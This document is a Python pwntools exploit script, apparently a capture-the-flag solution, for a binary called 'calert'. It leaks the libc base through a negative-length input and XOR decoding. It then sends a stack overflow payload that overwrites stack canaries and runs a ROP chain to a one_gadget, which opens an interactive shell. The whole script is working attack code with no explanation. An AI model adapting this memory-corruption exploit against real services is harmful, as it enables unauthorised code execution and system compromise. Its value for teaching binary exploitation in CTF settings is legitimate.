#!/usr/bin/env python3
from pwn import *

context.aslr = False
context.arch = 'amd64'
# host = '61.28.237.86'
# port = 1234
exe = './calert'
elf = ELF(exe)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
script = '''
b *0x0000555555555448  
b *0x0000555555555606
b *0x00005555555554bd
c
'''
if args.LOCAL:
    p = process(exe)
elif args.GDB:
    p = process(exe)
    gdb.attach(p, gdbscript=script)
else:
    p = remote(host, port)

def senddata(len, data):
    p.recvuntil(b'input: ')
    p.sendline(str(len).encode())
    p.send(data)

# leak libc base
senddata(-1, b'\n')
senddata(127, b'\n')
data = bytes.fromhex(p.recvline().decode())
xor_key = b'0123456789ABCDEF'
res = b''
for c, i in enumerate(data):
    res += (i ^ xor_key[c % 16]).to_bytes(1, 'little')

libc_base = u64(res[8:16]) - libc.sym['write'] - 100
log.info('leak libc base ' + hex(libc_base))
libc.address = libc_base

# get shell 
writeable1 = 0x1be370 + libc_base
writeable2 = 0x1be390 + libc_base
one_gadget = 0xcbd20 + libc_base
rdi = 0x0000000000026796 + libc_base
rsi = 0x000000000002890f + libc_base
rdx = 0x00000000000cb1cd + libc_base
mov_ptr_rsi_rdi = 0x0000000000118b7d + libc_base
ret = 0x00000000000a85da + libc_base
# chain = [rdi, 0x068732f6e69622f, rsi, writeable1, mov_ptr_rsi_rdi,
#         rdi, writeable1, ret, libc.sym['system']]
chain = [rsi, 0, rdx, 0, one_gadget]
rop_chain = b''.join(map(p64, chain))

payload = b'a'*0x108
payload += b'b'*8   # overwrite canary
payload += b'a'*8 + rop_chain
payload += cyclic(2224 - len(payload), n=8)
payload += p64(writeable2)
payload += cyclic(0x860+0x108 - len(payload), n=8)
payload += b'b'*8   # overwrite original canary
payload += b'\n'
senddata(-1, payload)

p.interactive()
